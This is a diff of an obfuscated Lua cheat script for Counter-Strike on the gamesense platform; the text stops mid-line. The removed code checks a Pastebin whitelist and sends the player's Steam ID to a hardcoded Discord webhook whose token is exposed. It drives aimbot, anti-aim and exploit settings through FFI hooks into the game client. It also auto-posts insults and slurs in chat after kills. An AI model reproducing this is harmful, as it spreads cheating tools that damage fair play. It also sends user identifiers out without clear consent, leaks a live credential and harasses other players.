@@ -1,94 +1,1865 @@
-do local v0="calamity";local v1={r=1272 -(741 + 376) ,g=157,b=52 + 165 };local v2=(obex_fetch and obex_fetch()) or {username="user",build="recode",discord=""} ;local v3=require("vector");local function v4(v56,v57) local v58,v59=pcall(require,v56);if v58 then return v59;else return error(v57);end end local v5=v4("gamesense/images","Download images library: https://gamesense.pub/forums/viewtopic.php?id=22917");local v6=v4("bit");local v7=v4("gamesense/base64","Download base64 encode/decode library: https://gamesense.pub/forums/viewtopic.php?id=21619");local v8=v4("gamesense/antiaim_funcs","Download anti-aim functions library: https://gamesense.pub/forums/viewtopic.php?id=29665");local v9=v4("ffi","Failed to require FFI, please make sure Allow unsafe scripts is enabled!");local v3=v4("vector","Missing vector");local v10=v4("gamesense/http","Download HTTP library: https://gamesense.pub/forums/viewtopic.php?id=21619");local v11=v4("gamesense/clipboard","Download Clipboard library: https://gamesense.pub/forums/viewtopic.php?id=28678");local v12=v4("gamesense/entity","Download Entity Object library: https://gamesense.pub/forums/viewtopic.php?id=27529");local v13=v4("gamesense/csgo_weapons","Download CS:GO weapon data library: https://gamesense.pub/forums/viewtopic.php?id=18807");local v12=v4("gamesense/entity");local v14=v4("gamesense/steamworks") or error("Missing https://gamesense.pub/forums/viewtopic.php?id=26526") ;client.log(client.color_log(client.random_int(1578 -(280 + 1297) ,255),client.random_int(766 -(574 + 191) ,211 + 44 ),client.random_int(2 -1 ,131 + 124 ),"[FreeDom] hwid checking"));local v15={Run=function() local v60=require("gamesense/http");local v61=require("gamesense/discord_webhooks");require("gamesense/panorama_valve_utils");local v62="https://discord.com/api/webhooks/1337760038319689788/rzjcxa9w1ZJ92EkZGto-hCEYFtKZp6mUTgKftYYwVKPNEv8Jv-w42KVCYwkyMZVHK2rg";local v63="https://pastebin.com/raw/xjy0Ps0y";local function v64() local v171=panorama.open();local v172=v171.MyPersonaAPI.GetXuid();return v172 or "Unknown HWID" ;end local function v65(v173,v174) local v175=v61.new(v62);local v176=v61.newEmbed();v176:setTitle((v174 and "Подписка оформлена") or "Подписка не оформлена | You dont have sub" );v176:setDescription((v174 and "Пользователь успешно вошёл") or "Попытка загрузки с неверным HWID" );v176:setColor((v174 and (3067842 -(254 + 595))) or 15158332 );v176:addField("HWID",v173,true);local v177,v178=pcall(function() v175:send(v176);end);if  not v177 then print("Ошибка отправки вебхука: "   .. tostring(v178) );end end local v66=v64();print("Проверка HWID: "   .. v66 );v60.get(v63,function(v179,v180) if ( not v179 or (v180.status~=(326 -(55 + 71)))) then print("Ошибка подключения к серверу");error("Проверьте включен ли у вас интернет");return;end local v181=v180.body;if ( not v181 or  not v181:find(v66)) then local v783=0 -0 ;while true do if ((1791 -(573 + 1217))==v783) then error("Доступ запрещён");return;end if (v783==0) then print("Сервер был выключен либо ваш хвид недоступен");v65(v66,false);v783=2 -1 ;end end end print("Welcome");v65(v66,true);v9.cdef([[
-    struct animation_layer_t {
-		bool m_bClientBlend;		 //0x0000
-		float m_flBlendIn;			 //0x0004
-		void* m_pStudioHdr;			 //0x0008
-		int m_nDispatchSequence;     //0x000C
-		int m_nDispatchSequence_2;   //0x0010
-		uint32_t m_nOrder;           //0x0014
-		uint32_t m_nSequence;        //0x0018
-		float m_flPrevCycle;       //0x001C
-		float m_flWeight;          //0x0020
-		float m_flWeightDeltaRate; //0x0024
-		float m_flPlaybackRate;    //0x0028
-		float m_flCycle;           //0x002C
-		void* m_pOwner;              //0x0030
-		char pad_0038[4];            //0x0034
-    };
-    struct c_animstate { 
-        char pad[ 3 ];
-        char m_bForceWeaponUpdate; //0x4
-        char pad1[ 91 ];
-        void* m_pBaseEntity; //0x60
-        void* m_pActiveWeapon; //0x64
-        void* m_pLastActiveWeapon; //0x68
-        float m_flPrevCycle; //0x001C
-        float m_flWeight; //0x0020
-        float m_flWeightDeltaRate; //0x0024
-        float m_flPlaybackRate; //0x0028
-        float m_flLastClientSideAnimationUpdateTime; //0x6C
-        int m_iLastClientSideAnimationUpdateFramecount; //0x70
-        float m_flAnimUpdateDelta; //0x74
-        float m_flEyeYaw; //0x78
-        float m_flPitch; //0x7C
-        float m_flGoalFeetYaw; //0x80
-        float m_flCurrentFeetYaw; //0x84   
-        float m_flCurrentTorsoYaw; //0x88
-        float m_flUnknownVelocityLean; //0x8C
-        float m_flLeanAmount; //0x90
-        char pad2[ 4 ];
-        float m_flFeetCycle; //0x98
-        float m_flFeetYawRate; //0x9C
-        char pad3[ 4 ];
-        float m_fDuckAmount; //0xA4
-        float m_fLandingDuckAdditiveSomething; //0xA8
-        char pad4[ 4 ];
-        float m_vOriginX; //0xB0
-        float m_vOriginY; //0xB4
-        float m_vOriginZ; //0xB8
-        float m_vLastOriginX; //0xBC
-        float m_vLastOriginY; //0xC0
-        float m_vLastOriginZ; //0xC4
-        float m_vVelocityX; //0xC8
-        float m_vVelocityY; //0xCC
-        char pad5[ 4 ];
-        float m_flUnknownFloat1; //0xD4
-        char pad6[ 8 ];
-        float m_flUnknownFloat2; //0xE0
-        float m_flUnknownFloat3; //0xE4
-        float m_flUnknown; //0xE8
-        float m_flSpeed2D; //0xEC
-        float m_flUpVelocity; //0xF0
-        float m_flSpeedNormalized; //0xF4
-        float m_flFeetSpeedForwardsOrSideWays; //0xF8
-        float m_flFeetSpeedUnknownForwardOrSideways; //0xFC
-        float m_flTimeSinceStartedMoving; //0x100
-        float m_flTimeSinceStoppedMoving; //0x104
-        bool m_bOnGround; //0x108
-        bool m_bInHitGroundAnimation; //0x109
-        float m_flTimeSinceInAir; //0x10A
-        float m_flLastOriginZ; //0x10E
-        float m_flHeadHeightOrOffsetFromHittingGroundAnimation; //0x112
-        float m_flStopToFullRunningFraction; //0x116
-        char pad7[ 4 ]; //0x11A
-        float m_flMagicFraction; //0x11E
-        char pad8[ 60 ]; //0x122
-        float m_flWorldForce; //0x15E
-        char pad9[ 462 ]; //0x162
-        float m_flMaxYaw; //0x334
-        float m_flMinYaw; //0x330
-    };
-]]);local v182=v9.typeof("void***");local v183=client.create_interface("client.dll","VClientEntityList003") or error("VClientEntityList003 wasnt found",1 + 1 ) ;local v184=v9.cast(v182,v183) or error("rawientitylist is nil",2) ;local v185=v9.cast("void*(__thiscall*)(void*, int)",v184[0 -0 ][0]) or error("get_client_networkable_t is nil",941 -(714 + 225) ) ;local v186=v9.cast("void*(__thiscall*)(void*, int)",v184[0][8 -5 ]) or error("get_client_entity is nil",2) ;local v187=client.create_interface("engine.dll","VModelInfoClient004");local v188=v9.cast(v182,v187) or error("rawivmodelinfo is nil",2) ;local v189=require("ffi");v189.cdef([[
-    typedef void*(__thiscall* get_net_channel_info_t)(void*);
+print("Welcome Back")
+client.color_log(175,124,255, "https://discord.gg/fwfYHDKA")
+client.color_log(175,124,255, "Coder vedyzy")
 
-    typedef float(__thiscall* get_avg_latency_t)(void*, int);
-    typedef float(__thiscall* get_avg_loss_t)(void*, int);
-    typedef float(__thiscall* get_avg_choke_t)(void*, int);
-]]);local v190=v189.typeof("void***");local v191=client.create_interface("engine.dll","VEngineClient014") or error("VEngineClient014 wasnt found",2 -0 ) ;local v192=v189.cast(v190,v191) or error("rawivengineclient is nil",2) ;local v193=v189.cast("get_net_channel_info_t",v192[0 + 0 ][112 -34 ]) or error("ivengineclient is nil") ;local v194=(function() local v325=806 -(118 + 688) ;local v326;while true do if (v325==1) then v326.update=function(v1027,v1028,v1029) local v1030=false;if ((v1027.timers[v1028]==nil) or ((v1027.timers[v1028] -globals.realtime())<=(48 -(25 + 23)))) then v1027.timers[v1028]=globals.realtime() + v1029 ;v1030=true;end return v1030;end;return v326;end if (v325==(0 + 0)) then v326={};v326.timers={};v325=1887 -(927 + 959) ;end end end)();local v195=function(v327,v328) local v329={};for v784=1,v328 do v329[v784]=v327;end return v329;end;local v196=function(v330,v331,v332) local v333=v330;if (v332 or (v333[ #v333]~=v331)) then local v897=0;while true do if (v897==(0 -0)) then table.insert(v333,v331);table.remove(v333,1);break;end end end v330=v333;end;local v197=function(v334) local v335,v336=732 -(16 + 716) ,0 -0 ;for v786,v787 in pairs(v334) do local v788=97 -(11 + 86) ;while true do if (v788==(0 -0)) then v336=v336 + v787 ;v335=v335 + (286 -(175 + 110)) ;break;end end end return v336/v335 ;end;local v198=v195(0 -0 ,78 -62 );local v199={tr=0,tr_ex=1796 -(503 + 1293) ,maximum=0 -0 };local v200={username=v2.username,version="2.0",build=v2.build};if (v200.build=="User") then v200.build="recode";end client.exec("clear");client.color_log(115 + 44 ,1263 -(810 + 251) ,43,"[calamity] ~\0");client.color_log(177 + 78 ,79 + 176 ,230 + 25 ," Welcome back,\0");client.color_log(159,202,576 -(43 + 490) ," "   .. v200.username   .. "!" );client.color_log(892 -(711 + 22) ,781 -579 ,902 -(240 + 619) ,"[calamity] ~\0");client.color_log(62 + 193 ,405 -150 ,255," Your build is:\0");client.color_log(11 + 148 ,1946 -(1344 + 400) ,448 -(255 + 150) ," "   .. v200.build:lower()   .. "!" );local v201={};v201.database={configs=":"   .. v0   .. "::configs:" };local v203={};v189.cdef([[
-    typedef unsigned long dword;
-    typedef unsigned int size_t;
 
-    typedef struct {
-        uint8_t r, g, b, a;
-    } color_t;
-]]);local v204={legit=ui.reference("LEGIT","Aimbot","Enabled"),dmgOverride={ui.reference("RAGE","Aimbot","Minimum damage override")},fakeDuck=ui.reference("RAGE","Other","Duck peek assist"),minDmg=ui.reference("RAGE","Aimbot","Minimum damage"),hitChance=ui.reference("RAGE","Aimbot","Minimum hit chance"),safePoint=ui.reference("RAGE","Aimbot","Force safe point"),forceBaim=ui.reference("RAGE","Aimbot","Force body aim"),dtLimit=ui.reference("RAGE","Aimbot","Double tap fake lag limit"),quickPeek={ui.reference("RAGE","Other","Quick peek assist")},AntiAimCorrect=ui.reference("RAGE","Other","Anti-aim correction"),CorrectEnable=ui.reference("PLAYERS","Adjustments","Correction active"),ForceBodyYawValue={ui.reference("PLAYERS","Adjustments","Force body yaw value")},ForceBodyYaw=ui.reference("PLAYERS","Adjustments","Force body yaw"),dt={ui.reference("RAGE","Aimbot","Double tap")},enabled=ui.reference("AA","Anti-aimbot angles","Enabled"),pitch={ui.reference("AA","Anti-aimbot angles","pitch")},roll=ui.reference("AA","Anti-aimbot angles","roll"),yawBase=ui.reference("AA","Anti-aimbot angles","Yaw base"),yaw={ui.reference("AA","Anti-aimbot angles","Yaw")},flLimit=ui.reference("AA","Fake lag","Limit"),fsBodyYaw=ui.reference("AA","anti-aimbot angles","Freestanding body yaw"),edgeYaw=ui.reference("AA","Anti-aimbot angles","Edge yaw"),yawJitter={ui.reference("AA","Anti-aimbot angles","Yaw jitter")},bodyYaw={ui.reference("AA","Anti-aimbot angles","Body yaw")},freeStand={ui.reference("AA","Anti-aimbot angles","Freestanding")},os={ui.reference("AA","Other","On shot anti-aim")},slow={ui.reference("AA","Other","Slow motion")},fakeLag={ui.reference("AA","Fake lag","Limit")},legMovement=ui.reference("AA","Other","Leg movement"),indicators={ui.reference("VISUALS","Other ESP","Feature indicators")},ping={ui.reference("MISC","Miscellaneous","Ping spike")}};local v205={localPlayer=0,hitgroup_names={"Generic","Head","Chest","Stomach","Left arm","Right arm","Left leg","Right leg","Neck","resolver","Gear"},aaStates={"Global","Standing","Moving","Slowwalking","Crouching","Air","Air-Crouching","Legit-AA"},pStates={"G","S","M","SW","C","A","AC","LA"},sToInt={Global=1791 -(1010 + 780) ,Standing=2,Moving=3 + 0 ,Slowwalking=19 -15 ,Crouching=14 -9 ,Air=6,["Air-Crouching"]=1843 -(1045 + 791) ,["Legit-AA"]=19 -11 },intToS={[1]="Global",[2]="Standing",[4 -1 ]="Moving",[509 -(351 + 154) ]="Slowwalk",[5]="Ducking",[1580 -(1281 + 293) ]="Jumping",[273 -(28 + 238) ]="Jumping+",[8]="Legit"},currentTab=2 -1 ,activeState=1560 -(1381 + 178) ,pState=1 + 0 ,should_disable=false,defensive_until=0 + 0 ,defensive_prev_sim=0 + 0 ,fs=false,choke1=0 -0 ,choke2=0 + 0 ,choke3=470 -(381 + 89) ,choke4=0 + 0 ,switch=false};local v206={"ты не иглок","гет гуд гет calamity","пздц ты немощ","pfdnhf d irjke, cgb csyjr t,fyysq","слоу пидарас","пошел нахуй","лижи мне пятки уебанец","я тя вытрахал под самые гланды","тебе уже пора осознать что ты слоу","ты как *ANYA HVH* так же отсасываешь мою дикулю"};local v207=panorama.open();local v208,v209,v210,v211=v207.MyPersonaAPI,v207.LobbyAPI,v207.PartyListAPI,v207.SteamOverlayAPI;local v212={fclamp=function(v337,v338,v339) return math.max(v338,math.min(v337,v339));end,frgba=function(v340) v340=v340:gsub("#","");local v341=tonumber(v340:sub(1 + 0 ,1 + 1 ),16 + 0 );local v342=tonumber(v340:sub(11 -8 ,1730 -(1668 + 58) ),642 -(512 + 114) );local v343=tonumber(v340:sub(13 -8 ,6),16);local v344=tonumber(v340:sub(7,16 -8 ),55 -39 ) or (119 + 136) ;return v341,v342,v343,v344;end,render_text=function(v345,v346,...) local v347=0 + 0 ;local v348={...};for v790,v791 in pairs(v348) do local v792=0;local v793;local v794;local v795;local v796;local v797;local v798;while true do if (v792==1) then renderer.text(v345 + v347 ,v346,v793,v794,v795,v796,"-d",0 + 0 ,v797);v347=v347 + v798.x ;break;end if (v792==(0 -0)) then v793,v794,v795,v796,v797=unpack(v791);v798=v3(renderer.measure_text("-d",v797));v792=1995 -(109 + 1885) ;end end end end,easeInOut=function(v349) return ((v349>(1469.5 -(1269 + 200))) and (((7 -3) * ((v349-(816 -(98 + 717)))^3)) + (827 -(802 + 24)))) or ((6 -2) * (v349^(3 -0))) ;end,rec=function(v350,v351,v352,v353,v354,v355) v354=math.min(v350/(1 + 1) ,v351/(2 + 0) ,v354);local v356,v357,v358,v359=unpack(v355);renderer.rectangle(v350,v351 + v354 ,v352,v353-(v354 * 2) ,v356,v357,v358,v359);renderer.rectangle(v350 + v354 ,v351,v352-(v354 * 2) ,v354,v356,v357,v358,v359);renderer.rectangle(v350 + v354 ,(v351 + v353) -v354 ,v352-(v354 * (1 + 1)) ,v354,v356,v357,v358,v359);renderer.circle(v350 + v354 ,v351 + v354 ,v356,v357,v358,v359,v354,39 + 141 ,0.25 -0 );renderer.circle((v350-v354) + v352 ,v351 + v354 ,v356,v357,v358,v359,v354,300 -210 ,0.25 + 0 );renderer.circle((v350-v354) + v352 ,(v351-v354) + v353 ,v356,v357,v358,v359,v354,0,0.25);renderer.circle(v350 + v354 ,(v351-v354) + v353 ,v356,v357,v358,v359,v354, -90,0.25 + 0 );end,rec_outline=function(v360,v361,v362,v363,v364,v365,v366) local v367=0;local v368;local v369;local v370;local v371;while true do if (v367==0) then v364=math.min(v362/(2 + 0) ,v363/(2 + 0) ,v364);v368,v369,v370,v371=unpack(v366);v367=1 + 0 ;end if (v367==(1434 -(797 + 636))) then if (v364==(4 -3)) then renderer.rectangle(v360,v361,v362,v365,v368,v369,v370,v371);renderer.rectangle(v360,(v361 + v363) -v365 ,v362,v365,v368,v369,v370,v371);else renderer.rectangle(v360 + v364 ,v361,v362-(v364 * 2) ,v365,v368,v369,v370,v371);renderer.rectangle(v360 + v364 ,(v361 + v363) -v365 ,v362-(v364 * (1621 -(1427 + 192))) ,v365,v368,v369,v370,v371);renderer.rectangle(v360,v361 + v364 ,v365,v363-(v364 * (1 + 1)) ,v368,v369,v370,v371);renderer.rectangle((v360 + v362) -v365 ,v361 + v364 ,v365,v363-(v364 * (4 -2)) ,v368,v369,v370,v371);renderer.circle_outline(v360 + v364 ,v361 + v364 ,v368,v369,v370,v371,v364,162 + 18 ,0.25 + 0 ,v365);renderer.circle_outline(v360 + v364 ,(v361 + v363) -v364 ,v368,v369,v370,v371,v364,416 -(192 + 134) ,1276.25 -(316 + 960) ,v365);renderer.circle_outline((v360 + v362) -v364 ,v361 + v364 ,v368,v369,v370,v371,v364, -(51 + 39),0.25,v365);renderer.circle_outline((v360 + v362) -v364 ,(v361 + v363) -v364 ,v368,v369,v370,v371,v364,0 + 0 ,0.25 + 0 ,v365);end break;end end end,clamp=function(v372,v373,v374) return ((v372<v373) and v373) or ((v372>v374) and v374) or v372 ;end,includes=function(v375,v376) for v799=1, #v375 do if (v375[v799]==v376) then return true;end end return false;end,setAATab=function(v377) local v378=0 -0 ;while true do if (1==v378) then ui.set_visible(v204.yawBase,v377);ui.set_visible(v204.yaw[552 -(83 + 468) ],v377);ui.set_visible(v204.yaw[2],v377);ui.set_visible(v204.yawJitter[1807 -(1202 + 604) ],v377);v378=9 -7 ;end if (v378==(2 -0)) then ui.set_visible(v204.yawJitter[5 -3 ],v377);ui.set_visible(v204.bodyYaw[326 -(45 + 280) ],v377);ui.set_visible(v204.bodyYaw[2],v377);ui.set_visible(v204.freeStand[1 + 0 ],v377);v378=3 + 0 ;end if (v378==(0 + 0)) then ui.set_visible(v204.enabled,v377);ui.set_visible(v204.pitch[1 + 0 ],v377);ui.set_visible(v204.pitch[2],v377);ui.set_visible(v204.roll,v377);v378=1 + 0 ;end if (v378==(5 -2)) then ui.set_visible(v204.freeStand[1913 -(340 + 1571) ],v377);ui.set_visible(v204.fsBodyYaw,v377);ui.set_visible(v204.edgeYaw,v377);break;end end end,findDist=function(v379,v380,v381,v382,v383,v384) return math.sqrt(((v382-v379)^(1 + 1)) + ((v383-v380)^2) + ((v384-v381)^(1774 -(1733 + 39))) );end,resetAATab=function() ui.set(v204.enabled,false);ui.set(v204.pitch[2 -1 ],"Off");ui.set(v204.pitch[1036 -(125 + 909) ],0);ui.set(v204.roll,1948 -(1096 + 852) );ui.set(v204.yawBase,"local view");ui.set(v204.yaw[1],"Off");ui.set(v204.yaw[1 + 1 ],0);ui.set(v204.yawJitter[1 -0 ],"Off");ui.set(v204.yawJitter[2 + 0 ],0);ui.set(v204.bodyYaw[513 -(409 + 103) ],"Off");ui.set(v204.bodyYaw[238 -(46 + 190) ],0);ui.set(v204.freeStand[96 -(51 + 44) ],false);ui.set(v204.freeStand[1 + 1 ],"On hotkey");ui.set(v204.fsBodyYaw,false);ui.set(v204.edgeYaw,false);end,type_from_string=function(v385) if (type(v385)~="string") then return v385;end local v386=v385:lower();if (v386=="true") then return true;elseif (v386=="false") then return false;elseif (tonumber(v386)~=nil) then return tonumber(v386);else return tostring(v385);end end,lerp=function(v387,v388,v389) return v387 + ((v388-v387) * v389) ;end,vec_angles=function(v390,v391) local v392=1317 -(1114 + 203) ;local v393;local v394;local v395;local v396;while true do if (v392==2) then return v396 * v394 ,v396 * v393 , -v395;end if (v392==(727 -(228 + 498))) then v395=math.sin(math.rad(v390));v396=math.cos(math.rad(v390));v392=1 + 1 ;end if (v392==(0 + 0)) then v393=math.sin(math.rad(v391));v394=math.cos(math.rad(v391));v392=664 -(174 + 489) ;end end end,hex=function(v397) local v398=0;local v399;while true do if (v398==1) then return v399   .. "FF" ;end if (v398==(0 -0)) then v399="\a";for v1031,v1032 in next,v397 do local v1033="";while v1032>(1905 -(830 + 1075))  do local v1106=math.fmod(v1032,540 -(303 + 221) ) + (1270 -(231 + 1038)) ;v1032=math.floor(v1032/(14 + 2) );v1033=string.sub("0123456789ABCDEF",v1106,v1106)   .. v1033 ;end if ( #v1033==0) then v1033="00";elseif ( #v1033==1) then v1033="0"   .. v1033 ;end v399=v399   .. v1033 ;end v398=1;end end end,split=function(v400,v401) local v402=1162 -(171 + 991) ;local v403;while true do if (v402==0) then if (v401==nil) then v401="%s";end v403={};v402=4 -3 ;end if (v402==(2 -1)) then for v1034 in string.gmatch(v400,"([^"   .. v401   .. "]+)" ) do table.insert(v403,v1034);end return v403;end end end,RGBAtoHEX=function(v404,v405,v406,v407) return string.format("%.2x%.2x%.2x%.2x",v404,v405,v406,v407);end,create_color_array=function(v408,v409,v410,v411) local v412={};for v800=0 -0 , #v411 do local v801={v408,v409,v410,255 * math.abs(1 * math.cos((((2 -0) * math.pi * globals.curtime())/4) + ((v800 * 5)/30) ) ) };table.insert(v412,v801);end return v412;end,textArray=function(v413) local v414={};for v802=3 -2 , #v413 do v414[v802]=v413.sub(v413,v802,v802);end return v414;end,gradient_text=function(v415,v416,v417,v418,v419,v420,v421,v422,v423) local v424="";local v425= #v423-(1249 -(111 + 1137)) ;local v426=(v419-v415)/v425 ;local v427=(v420-v416)/v425 ;local v428=(v421-v417)/v425 ;local v429=(v422-v418)/v425 ;for v804=159 -(91 + 67) ,v425 + (2 -1)  do local v805=0;while true do if (v805==0) then v424=v424   .. ("\a%02x%02x%02x%02x%s"):format(v415,v416,v417,v418,v423:sub(v804,v804)) ;v415=v415 + v426 ;v805=1 + 0 ;end if (v805==2) then v418=v418 + v429 ;break;end if ((524 -(423 + 100))==v805) then v416=v416 + v427 ;v417=v417 + v428 ;v805=2;end end end return v424;end,time_to_ticks=function(v430) return math.floor(0.5 + (v430/globals.tickinterval()) );end,headVisible=function(v431) local v432=0 + 0 ;local v433;local v434;local v435;local v436;local v437;local v438;local v439;local v440;local v441;while true do if (v432==2) then v440,v441=client.trace_line(v431,v434,v435,v436,v437,v438,v439);if ((v441==v433) or (v440==(2 -1))) then return true;else return false;end break;end if (v432==0) then v433=entity.get_local_player();if (v433==nil) then return;end v432=1 + 0 ;end if (v432==(772 -(326 + 445))) then v434,v435,v436=entity.hitbox_position(v431,1);v437,v438,v439=entity.hitbox_position(v433,4 -3 );v432=4 -2 ;end end end,defensive={cmd=0,check=0,defensive=0 -0 },aa_clamp=function(v442) if (v442==nil) then return 711 -(530 + 181) ;end v442=((v442%(1241 -(614 + 267))) + 360)%(392 -(19 + 13)) ;return ((v442>(292 -112)) and (v442-(838 -478))) or v442 ;end};client.set_event_callback("run_command",function(v443) v212.defensive.cmd=v443.command_number;end);client.set_event_callback("predict_command",function(v446) if (v446.command_number==v212.defensive.cmd) then local v898=entity.get_prop(entity.get_local_player(),"m_nTickBase");v212.defensive.defensive=math.abs(v898-v212.defensive.check );v212.defensive.check=math.max(v898,v212.defensive.check or 0 );v212.defensive.cmd=0 -0 ;end end);client.set_event_callback("level_init",function() v212.defensive.check,v212.defensive.defensive=0 + 0 ,0 -0 ;end);local v213=function(v449,v450) local v451=0 -0 ;local v452;local v453;local v454;local v455;while true do if (v451==(1813 -(1293 + 519))) then v454=globals.tickcount() + v212.time_to_ticks(client.latency()) ;v455=v454/v212.time_to_ticks(0.3 -0 ) ;v451=2;end if (v451==(4 -2)) then v455=math.floor(v455% #v450 );v455=v450[v455 + (1 -0) ] + (4 -3) ;v451=6 -3 ;end if (v451==(2 + 1)) then return string.sub(v452,v455,v455 + 4 + 11 );end if (v451==(0 -0)) then v452="               "   .. v449   .. "" ;v453=globals.tickinterval();v451=1;end end end;local v214=function(v456) local v457,v458=v456.userid,v456.attacker;if ((v457==nil) or (v458==nil)) then return;end local v459=client.userid_to_entindex(v457);local v460=client.userid_to_entindex(v458);if ((v460==entity.get_local_player()) and entity.is_enemy(v459)) then local v902=0 + 0 ;local v903;local v904;while true do if (v902==1) then client.delay_call(3,function() client.exec(v904);end);break;end if (v902==0) then v903=v206[math.random(1 + 0 , #v206)];v904="say "   .. v903 ;v902=1 + 0 ;end end end end;local v215=function(v461,v462,v463,v464,v465) local v466=1096 -(709 + 387) ;local v467;local v468;local v469;while true do if (v466==1) then v469="";for v1035,v1036 in ipairs(v212.split(v461,"$")) do v469=v469   .. ((((v1035%2)==(((v461:sub(1859 -(673 + 1185) ,2 -1 )=="$") and 0) or 1)) and v468) or v467)   .. v1036 ;end v466=2;end if (v466==(6 -4)) then return v469;end if (v466==(0 -0)) then v467="\a"   .. v212.RGBAtoHEX(v462,v463,v464,v465) ;v468="\a"   .. v212.RGBAtoHEX(255,183 + 72 ,191 + 64 ,v465) ;v466=1 -0 ;end end end;local v216=function(v470,v471,v472,v473,v474,v475,v476,v477) local v478=1 + 0 ;local v479=1 -0 ;local v480,v481,v482,v483=unpack(v476);if v477 then v212.rec(v470,v471,v472,v473 + (1 -0) ,v475,v477);end for v806=0,v474 do if ((v483 * ((v806/v474)^(1881 -(446 + 1434))))>(1288 -(1040 + 243))) then local v996=0 -0 ;local v997;while true do if (v996==(1847 -(559 + 1288))) then v997={v480,v481,v482,v483 * ((v806/v474)^2) };v212.rec_outline(v470 + (((v806-v474) -v479) * v478) ,v471 + (((v806-v474) -v479) * v478) ,v472-(((v806-v474) -v479) * v478 * (456 -(13 + 441))) ,(v473 + 1) -(((v806-v474) -v479) * v478 * (7 -5)) ,v475 + (v478 * ((v474-v806) + v479)) ,v478,v997);break;end end end end end;local v217={lerp=function(v484,v485,v486,v487) local v488=0 -0 ;while true do if (v488==(0 -0)) then if ((type(v485)=="table") and (type(v486)=="table")) then return {v484:lerp(v485[3 -2 ],v486[1 + 0 ],v487),v484:lerp(v485[5 -3 ],v486[2 + 0 ],v487),v484:lerp(v485[2 + 1 ],v486[2 + 1 ],v487)};end return v485 + ((v486-v485) * v487) ;end end end,console=function(v489,...) for v807,v808 in ipairs({...}) do if ((type(v808[1 + 0 ])=="table") and (type(v808[2 + 0 ])=="table") and (type(v808[436 -(153 + 280) ])=="string")) then for v1037=2 -1 , #v808[3] do local v1038=0 + 0 ;local v1039;while true do if (v1038==(0 + 0)) then v1039=v489:lerp(v808[1],v808[2],v1037/ #v808[2 + 1 ] );client.color_log(v1039[1],v1039[2],v1039[3],v808[3]:sub(v1037,v1037)   .. "\0" );break;end end end elseif ((type(v808[1])=="table") and (type(v808[2])=="string")) then client.color_log(v808[1][1],v808[1 + 0 ][2 + 0 ],v808[1][4 -1 ],v808[2]   .. "\0" );end end end,text=function(v490,...) local v491=false;local v492=158 + 97 ;local v493="";for v809,v810 in ipairs({...}) do if (type(v810)=="boolean") then v491=v810;elseif (type(v810)=="number") then v492=v810;elseif (type(v810)=="string") then v493=v493   .. v810 ;elseif (type(v810)=="table") then if ((type(v810[1 + 0 ])=="table") and (type(v810[3 -1 ])=="string")) then v493=v493   .. ("\a%02x%02x%02x%02x"):format(v810[1][1050 -(572 + 477) ],v810[1 + 0 ][2 + 0 ],v810[1][1 + 2 ],v492)   .. v810[88 -(84 + 2) ] ;elseif ((type(v810[1 -0 ])=="table") and (type(v810[2])=="table") and (type(v810[3])=="string")) then for v1278=1 + 0 , #v810[845 -(497 + 345) ] do local v1279=v490:lerp(v810[1],v810[1 + 1 ],v1278/ #v810[3] );v493=v493   .. ("\a%02x%02x%02x%02x"):format(v1279[1 + 0 ],v1279[1335 -(605 + 728) ],v1279[3 + 0 ],v492)   .. v810[3]:sub(v1278,v1278) ;end end end end return ("%s\a%s%02x"):format(v493,(v491 and "cdcdcd") or "ffffff" ,v492);end,log=function(v494,...) for v811,v812 in ipairs({...}) do if (type(v812)=="table") then if (type(v812[1 -0 ])=="table") then if (type(v812[2])=="string") then local v1157=0 + 0 ;while true do if (v1157==(0 -0)) then v494:console({v812[1],v812[1 + 0 ],v812[2]});if v812[3] then v494:console({{1657 -(832 + 570) ,67 + 188 ,123 + 132 },"\n"});end break;end end elseif (type(v812[2])=="table") then v494:console({v812[1],v812[2],v812[3]});if v812[4] then v494:console({{908 -(232 + 421) ,255,49 + 206 },"\n"});end end elseif (type(v812[606 -(316 + 289) ])=="string") then v494:console({{1658 -(666 + 787) ,192 + 13 ,323 -118 },v812[1]});if v812[2 + 0 ] then v494:console({{1154 -(503 + 396) ,494 -239 ,255},"\n"});end end end end end};local v218;local function v219() v60.get(string.format("https://flagsapi.com/%s/flat/64.png",v208.GetMyCountryCode()),function(v813,v814) local v815=0 -0 ;while true do if ((0 + 0)==v815) then if ( not v813 or (v814.status~=(456 -256))) then print("[!] Failed fetch the country image, please contact admin to fix this issue!");return;end v218=v814.body;break;end end end);end v219();local v220,v221="AA","Anti-aimbot angles";local v222=ui.new_checkbox(v220,v221,"calamity - "   .. v200.username:lower() );local v223=ui.new_combobox(v220,v221,"\nTab","Anti-aim","Builder","Visuals","Misc","Config");local v224={aaTab={aamenushka=ui.new_multiselect(v220,v221,"\nTasdasdsadsadsadasdad","Adjust fakelag limit","Discharge Exploit","Safe Knife","Freestand","Edge Yaw","Avoid~Backstab","Manuals","Static on manuals"),freestandHotkey=ui.new_hotkey(v220,v221,"Freestand"),freestandDisablers=ui.new_multiselect(v220,v221,"› Disablers",{"Air","Slowmo","Duck","Manual"}),edgeYawHotkey=ui.new_hotkey(v220,v221,"Edge Yaw"),manualTab={manualLeft=ui.new_hotkey(v220,v221,"› Manual "   .. v212.hex({305 -105 ,1444 -(485 + 759) ,200})   .. "left" ),manualRight=ui.new_hotkey(v220,v221,"› Manual "   .. v212.hex({1389 -(442 + 747) ,1146 -(88 + 858) ,166 + 34 })   .. "right" ),manualReset=ui.new_hotkey(v220,v221,"› Manual "   .. v212.hex({989 -(766 + 23) ,273 -73 ,678 -478 })   .. "reset" ),manualForward=ui.new_hotkey(v220,v221,"› Manual "   .. v212.hex({142 + 58 ,200,1680 -(641 + 839) })   .. "forward" )}},builderTab={state=ui.new_combobox(v220,v221,"Anti-aim state",v205.aaStates)},visualsTab={space=ui.new_label(v220,v221,"\nTab3"),BackgroundColorLabel=ui.new_label(v220,v221,"Background Color"),BackgroundColor=ui.new_color_picker(v220,v221,"Background Color",v1.r,v1.g,v1.b,1168 -(910 + 3) ),space9=ui.new_label(v220,v221,"\nTab4"),aspect_ratio=ui.new_checkbox(v220,v221,"Aspect ratio"),aspect_ratio_v=ui.new_slider(v220,v221,"Aspect ratio value",0 -0 ,1884 -(1466 + 218) ,0 + 0 ),defensive_indicator=ui.new_checkbox(v220,v221,"Defensive indicator"),defensive_indicator_v=ui.new_slider(v220,v221,"Defensive indicator",1149 -(556 + 592) ,2,2),indicators=ui.new_combobox(v220,v221,"Indicators","Disabled","Soft"),indicatorsClr=ui.new_color_picker(v220,v221,"Main 